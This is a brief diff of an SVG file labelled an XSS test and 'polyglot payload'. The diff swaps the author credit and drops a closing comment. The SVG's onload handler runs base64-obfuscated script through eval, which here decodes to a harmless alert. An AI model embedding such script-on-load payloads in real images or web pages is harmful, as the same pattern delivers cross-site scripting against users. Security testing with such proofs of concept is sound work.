@@ -7,6 +7,5 @@
      xmlns:xlink="http://www.w3.org/1999/xlink"
      onload="eval(atob('YWxlcnQoJ1hTUyB0cmlnZ2VyZWQnKQ=='))">
   <title>Zora XSS Test</title>
-  <desc>SVG Polyglot Payload by bug4y0u</desc>
+  <desc>SVG Polyglot Payload by Johntheose</desc>
 </svg>
-<!-- ZORAXSS Polyglot End -->
